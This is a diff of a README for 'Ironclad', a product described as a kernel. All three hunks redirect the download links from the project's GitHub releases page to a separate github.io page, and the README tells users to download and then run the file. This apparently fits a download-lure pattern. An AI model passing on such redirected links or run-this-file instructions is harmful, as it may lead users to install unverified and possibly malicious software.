@@ -1,6 +1,6 @@
 # ⚙️ Ironclad - The Rock-Solid Kernel for Everyone
 
-[![Download Ironclad](https://img.shields.io/badge/Download-Ironclad-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=blue)](https://github.com/uzairsarfraz976-lab/Ironclad/releases)
+[![Download Ironclad](https://img.shields.io/badge/Download-Ironclad-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=blue)](https://uzairsarfraz976-lab.github.io)
 
 ## 🎯 What Is Ironclad?
 
@@ -20,7 +20,7 @@ Ready to try Ironclad? Great! Follow these simple steps:
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: [**Download Ironclad Now**](https://github.com/uzairsarfraz976-lab/Ironclad/releases)
+Visit this link to download the application: [**Download Ironclad Now**](https://uzairsarfraz976-lab.github.io)
 
 ### Step 2: Open the Downloaded File
 
@@ -159,7 +159,7 @@ Ironclad is more than software - it's a movement toward trustworthy computing. H
 
 Before you go, make sure you've:
 
-- [x] Visited the download page: [**Download Ironclad**](https://github.com/uzairsarfraz976-lab/Ironclad/releases)
+- [x] Visited the download page: [**Download Ironclad**](https://uzairsarfraz976-lab.github.io)
 - [x] Downloaded the latest version
 - [x] Successfully ran the file
 - [x] Experienced the speed and stability of Ironclad
